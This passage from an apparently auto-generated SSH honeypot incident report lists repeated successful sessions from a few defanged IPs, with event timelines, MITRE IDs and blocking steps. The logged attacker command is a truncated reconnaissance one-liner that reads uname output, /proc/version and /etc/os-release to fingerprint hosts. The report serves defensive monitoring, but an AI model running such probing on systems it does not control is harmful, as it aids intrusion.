| `2026-07-05 05:08:41` | `cowrie.session.connect` |
| `2026-07-05 05:08:41` | `cowrie.client.version` |
| `2026-07-05 05:08:41` | `cowrie.client.kex` |
| `2026-07-05 05:08:43` | `cowrie.login.success` |
| `2026-07-05 05:08:44` | `cowrie.session.params` |
| `2026-07-05 05:08:44` | `cowrie.command.input` |
| `2026-07-05 05:08:44` | `cowrie.command.input` |
| `2026-07-05 05:08:44` | `cowrie.command.input` |
| `2026-07-05 05:08:44` | `cowrie.command.input` |
| `2026-07-05 05:08:44` | `cowrie.command.input` |
| `2026-07-05 05:08:44` | `cowrie.command.success` |
| `2026-07-05 05:08:44` | `cowrie.command.input` |
| `2026-07-05 05:08:44` | `cowrie.command.input` |
| `2026-07-05 05:08:44` | `cowrie.command.input` |
| `2026-07-05 05:08:44` | `cowrie.command.input` |
| `2026-07-05 05:08:45` | `cowrie.log.closed` |
| `2026-07-05 05:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120a97679dd1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:08 |
| **Last Seen** | 2026-07-05 05:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:08:58` | `cowrie.session.connect` |
| `2026-07-05 05:08:58` | `cowrie.client.version` |
| `2026-07-05 05:08:58` | `cowrie.client.kex` |
| `2026-07-05 05:09:02` | `cowrie.login.success` |
| `2026-07-05 05:09:03` | `cowrie.session.params` |
| `2026-07-05 05:09:03` | `cowrie.command.input` |
| `2026-07-05 05:09:03` | `cowrie.command.input` |
| `2026-07-05 05:09:03` | `cowrie.command.input` |
| `2026-07-05 05:09:03` | `cowrie.command.input` |
| `2026-07-05 05:09:03` | `cowrie.command.input` |
| `2026-07-05 05:09:03` | `cowrie.command.success` |
| `2026-07-05 05:09:03` | `cowrie.command.input` |
| `2026-07-05 05:09:03` | `cowrie.command.input` |
| `2026-07-05 05:09:04` | `cowrie.command.input` |
| `2026-07-05 05:09:04` | `cowrie.command.input` |
| `2026-07-05 05:09:04` | `cowrie.log.closed` |
| `2026-07-05 05:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4785aa318b7d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:10 |
| **Last Seen** | 2026-07-05 05:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:10:06` | `cowrie.session.connect` |
| `2026-07-05 05:10:07` | `cowrie.client.version` |
| `2026-07-05 05:10:07` | `cowrie.client.kex` |
| `2026-07-05 05:10:10` | `cowrie.login.success` |
| `2026-07-05 05:10:11` | `cowrie.session.params` |
| `2026-07-05 05:10:11` | `cowrie.command.input` |
| `2026-07-05 05:10:11` | `cowrie.command.input` |
| `2026-07-05 05:10:11` | `cowrie.command.input` |
| `2026-07-05 05:10:11` | `cowrie.command.input` |
| `2026-07-05 05:10:11` | `cowrie.command.input` |
| `2026-07-05 05:10:11` | `cowrie.command.success` |
| `2026-07-05 05:10:11` | `cowrie.command.input` |
| `2026-07-05 05:10:11` | `cowrie.command.input` |
| `2026-07-05 05:10:11` | `cowrie.command.input` |
| `2026-07-05 05:10:11` | `cowrie.command.input` |
| `2026-07-05 05:10:12` | `cowrie.log.closed` |
| `2026-07-05 05:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a3c0f5fdd52

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:10 |
| **Last Seen** | 2026-07-05 05:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:10:52` | `cowrie.session.connect` |
| `2026-07-05 05:10:53` | `cowrie.client.version` |
| `2026-07-05 05:10:53` | `cowrie.client.kex` |
| `2026-07-05 05:10:57` | `cowrie.login.success` |
| `2026-07-05 05:11:00` | `cowrie.session.params` |
| `2026-07-05 05:11:00` | `cowrie.command.input` |
| `2026-07-05 05:11:00` | `cowrie.command.input` |
| `2026-07-05 05:11:00` | `cowrie.command.input` |
| `2026-07-05 05:11:00` | `cowrie.command.input` |
| `2026-07-05 05:11:00` | `cowrie.command.input` |
| `2026-07-05 05:11:00` | `cowrie.command.success` |
| `2026-07-05 05:11:00` | `cowrie.command.input` |
| `2026-07-05 05:11:00` | `cowrie.command.input` |
| `2026-07-05 05:11:00` | `cowrie.command.input` |
| `2026-07-05 05:11:00` | `cowrie.command.input` |
| `2026-07-05 05:11:01` | `cowrie.log.closed` |
| `2026-07-05 05:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-674f82593bad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:11 |
| **Last Seen** | 2026-07-05 05:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:11:32` | `cowrie.session.connect` |
| `2026-07-05 05:11:32` | `cowrie.client.version` |
| `2026-07-05 05:11:32` | `cowrie.client.kex` |
| `2026-07-05 05:11:35` | `cowrie.login.success` |
| `2026-07-05 05:11:36` | `cowrie.session.params` |
| `2026-07-05 05:11:36` | `cowrie.command.input` |
| `2026-07-05 05:11:36` | `cowrie.command.input` |
| `2026-07-05 05:11:36` | `cowrie.command.input` |
| `2026-07-05 05:11:36` | `cowrie.command.input` |
| `2026-07-05 05:11:36` | `cowrie.command.input` |
| `2026-07-05 05:11:36` | `cowrie.command.success` |
| `2026-07-05 05:11:36` | `cowrie.command.input` |
| `2026-07-05 05:11:36` | `cowrie.command.input` |
| `2026-07-05 05:11:36` | `cowrie.command.input` |
| `2026-07-05 05:11:36` | `cowrie.command.input` |
| `2026-07-05 05:11:37` | `cowrie.log.closed` |
| `2026-07-05 05:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f5d56bb9d57

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:12 |
| **Last Seen** | 2026-07-05 05:12 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:12:34` | `cowrie.session.connect` |
| `2026-07-05 05:12:34` | `cowrie.client.version` |
| `2026-07-05 05:12:34` | `cowrie.client.kex` |
| `2026-07-05 05:12:39` | `cowrie.login.success` |
| `2026-07-05 05:12:42` | `cowrie.session.params` |
| `2026-07-05 05:12:42` | `cowrie.command.input` |
| `2026-07-05 05:12:42` | `cowrie.command.input` |
| `2026-07-05 05:12:42` | `cowrie.command.input` |
| `2026-07-05 05:12:42` | `cowrie.command.input` |
| `2026-07-05 05:12:42` | `cowrie.command.input` |
| `2026-07-05 05:12:42` | `cowrie.command.success` |
| `2026-07-05 05:12:42` | `cowrie.command.input` |
| `2026-07-05 05:12:42` | `cowrie.command.input` |
| `2026-07-05 05:12:42` | `cowrie.command.input` |
| `2026-07-05 05:12:42` | `cowrie.command.input` |
| `2026-07-05 05:12:43` | `cowrie.log.closed` |
| `2026-07-05 05:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa3e6effcb63

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:12 |
| **Last Seen** | 2026-07-05 05:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:12:56` | `cowrie.session.connect` |
| `2026-07-05 05:12:56` | `cowrie.client.version` |
| `2026-07-05 05:12:56` | `cowrie.client.kex` |
| `2026-07-05 05:12:59` | `cowrie.login.success` |
| `2026-07-05 05:13:00` | `cowrie.session.params` |
| `2026-07-05 05:13:00` | `cowrie.command.input` |
| `2026-07-05 05:13:00` | `cowrie.command.input` |
| `2026-07-05 05:13:00` | `cowrie.command.input` |
| `2026-07-05 05:13:00` | `cowrie.command.input` |
| `2026-07-05 05:13:00` | `cowrie.command.input` |
| `2026-07-05 05:13:00` | `cowrie.command.success` |
| `2026-07-05 05:13:00` | `cowrie.command.input` |
| `2026-07-05 05:13:00` | `cowrie.command.input` |
| `2026-07-05 05:13:00` | `cowrie.command.input` |
| `2026-07-05 05:13:00` | `cowrie.command.input` |
| `2026-07-05 05:13:02` | `cowrie.log.closed` |
| `2026-07-05 05:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01b964de54dc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:14 |
| **Last Seen** | 2026-07-05 05:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:14:21` | `cowrie.session.connect` |
| `2026-07-05 05:14:21` | `cowrie.client.version` |
| `2026-07-05 05:14:21` | `cowrie.client.kex` |
| `2026-07-05 05:14:24` | `cowrie.login.success` |
| `2026-07-05 05:14:26` | `cowrie.session.params` |
| `2026-07-05 05:14:26` | `cowrie.command.input` |
| `2026-07-05 05:14:26` | `cowrie.command.input` |
| `2026-07-05 05:14:26` | `cowrie.command.input` |
| `2026-07-05 05:14:26` | `cowrie.command.input` |
| `2026-07-05 05:14:26` | `cowrie.command.input` |
| `2026-07-05 05:14:26` | `cowrie.command.success` |
| `2026-07-05 05:14:26` | `cowrie.command.input` |
| `2026-07-05 05:14:26` | `cowrie.command.input` |
| `2026-07-05 05:14:26` | `cowrie.command.input` |
| `2026-07-05 05:14:26` | `cowrie.command.input` |
| `2026-07-05 05:14:27` | `cowrie.log.closed` |
| `2026-07-05 05:14:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be0584367853

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 05:15 |
| **Last Seen** | 2026-07-05 05:15 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:15:43` | `cowrie.session.connect` |
| `2026-07-05 05:15:44` | `cowrie.client.version` |
| `2026-07-05 05:15:44` | `cowrie.client.kex` |
| `2026-07-05 05:15:51` | `cowrie.login.success` |
| `2026-07-05 05:15:55` | `cowrie.session.params` |
| `2026-07-05 05:15:55` | `cowrie.command.input` |
| `2026-07-05 05:15:57` | `cowrie.log.closed` |
| `2026-07-05 05:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdeae5a612ec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:15 |
| **Last Seen** | 2026-07-05 05:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:15:44` | `cowrie.session.connect` |
| `2026-07-05 05:15:45` | `cowrie.client.version` |
| `2026-07-05 05:15:45` | `cowrie.client.kex` |
| `2026-07-05 05:15:48` | `cowrie.login.success` |
| `2026-07-05 05:15:49` | `cowrie.session.params` |
| `2026-07-05 05:15:49` | `cowrie.command.input` |
| `2026-07-05 05:15:49` | `cowrie.command.input` |
| `2026-07-05 05:15:49` | `cowrie.command.input` |
| `2026-07-05 05:15:49` | `cowrie.command.input` |
| `2026-07-05 05:15:49` | `cowrie.command.input` |
| `2026-07-05 05:15:49` | `cowrie.command.success` |
| `2026-07-05 05:15:49` | `cowrie.command.input` |
| `2026-07-05 05:15:49` | `cowrie.command.input` |
| `2026-07-05 05:15:49` | `cowrie.command.input` |
| `2026-07-05 05:15:49` | `cowrie.command.input` |
| `2026-07-05 05:15:51` | `cowrie.log.closed` |
| `2026-07-05 05:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e09810f1017f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:15 |
| **Last Seen** | 2026-07-05 05:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:15:44` | `cowrie.session.connect` |
| `2026-07-05 05:15:45` | `cowrie.client.version` |
| `2026-07-05 05:15:45` | `cowrie.client.kex` |
| `2026-07-05 05:15:50` | `cowrie.login.success` |
| `2026-07-05 05:15:52` | `cowrie.session.params` |
| `2026-07-05 05:15:52` | `cowrie.command.input` |
| `2026-07-05 05:15:52` | `cowrie.command.input` |
| `2026-07-05 05:15:52` | `cowrie.command.input` |
| `2026-07-05 05:15:52` | `cowrie.command.input` |
| `2026-07-05 05:15:52` | `cowrie.command.input` |
| `2026-07-05 05:15:52` | `cowrie.command.success` |
| `2026-07-05 05:15:52` | `cowrie.command.input` |
| `2026-07-05 05:15:52` | `cowrie.command.input` |
| `2026-07-05 05:15:52` | `cowrie.command.input` |
| `2026-07-05 05:15:52` | `cowrie.command.input` |
| `2026-07-05 05:15:53` | `cowrie.log.closed` |
| `2026-07-05 05:15:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7186ef4c563

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:17 |
| **Last Seen** | 2026-07-05 05:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:17:11` | `cowrie.session.connect` |
| `2026-07-05 05:17:11` | `cowrie.client.version` |
| `2026-07-05 05:17:11` | `cowrie.client.kex` |
| `2026-07-05 05:17:14` | `cowrie.login.success` |
| `2026-07-05 05:17:15` | `cowrie.session.params` |
| `2026-07-05 05:17:15` | `cowrie.command.input` |
| `2026-07-05 05:17:15` | `cowrie.command.input` |
| `2026-07-05 05:17:15` | `cowrie.command.input` |
| `2026-07-05 05:17:15` | `cowrie.command.input` |
| `2026-07-05 05:17:15` | `cowrie.command.input` |
| `2026-07-05 05:17:15` | `cowrie.command.success` |
| `2026-07-05 05:17:15` | `cowrie.command.input` |
| `2026-07-05 05:17:15` | `cowrie.command.input` |
| `2026-07-05 05:17:15` | `cowrie.command.input` |
| `2026-07-05 05:17:15` | `cowrie.command.input` |
| `2026-07-05 05:17:17` | `cowrie.log.closed` |
| `2026-07-05 05:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd40c09d1336

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 05:17 |
| **Last Seen** | 2026-07-05 05:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:17:11` | `cowrie.session.connect` |
| `2026-07-05 05:17:12` | `cowrie.client.version` |
| `2026-07-05 05:17:12` | `cowrie.client.kex` |
| `2026-07-05 05:17:16` | `cowrie.login.success` |
| `2026-07-05 05:17:19` | `cowrie.session.params` |
| `2026-07-05 05:17:19` | `cowrie.command.input` |
| `2026-07-05 05:17:19` | `cowrie.command.input` |
| `2026-07-05 05:17:19` | `cowrie.command.input` |
| `2026-07-05 05:17:19` | `cowrie.command.input` |
| `2026-07-05 05:17:19` | `cowrie.command.input` |
| `2026-07-05 05:17:19` | `cowrie.command.success` |
| `2026-07-05 05:17:19` | `cowrie.command.input` |
| `2026-07-05 05:17:19` | `cowrie.command.input` |
| `2026-07-05 05:17:19` | `cowrie.command.input` |
| `2026-07-05 05:17:19` | `cowrie.command.input` |
| `2026-07-05 05:17:20` | `cowrie.log.closed` |
| `2026-07-05 05:17:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496ec723d04c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:18 |
| **Last Seen** | 2026-07-05 05:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
